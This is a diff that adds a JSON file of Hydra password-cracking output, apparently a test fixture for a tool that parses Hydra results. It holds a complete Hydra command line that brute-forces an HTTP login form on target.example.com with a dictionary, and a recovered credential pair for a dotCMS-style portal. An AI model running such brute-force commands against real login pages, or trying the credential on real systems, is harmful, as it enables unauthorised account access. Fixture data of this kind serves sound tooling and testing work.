@@ -1,0 +1,23 @@
+{
+  "generator": {
+    "software": "Hydra",
+    "version": "v8.6-dev",
+    "built": "2017-06-23 06:46:12",
+    "server": "target.example.com",
+    "service": "http-post-form",
+    "jsonoutputversion": "1.00",
+    "commandline": "/usr/local/bin/hydra -I -V -o /tmp/crydra-tmp-28618-results.json -b jsonv1 -s 8080 -L /tmp/crydra-tmp-28618-userlist.txt -t 2 -W 0 -d -P dictionary_sample_12.txt target.example.com http-post-form /c/portal_public/login:my_account_cmd=auth&referer=%2Fc&my_account_r_m=false&password=^PASS^&my_account_login=^USER^&my_account_email_address=:S=Processing login..."
+  },
+  "results": [
+    {
+      "port": 8080,
+      "service": "http-post-form",
+      "host": "target.example.com",
+      "login": "bill@dotcms.com",
+      "password": "bill"
+    }
+  ],
+  "success": true,
+  "errormessages": [],
+  "quantityfound": 1
+}
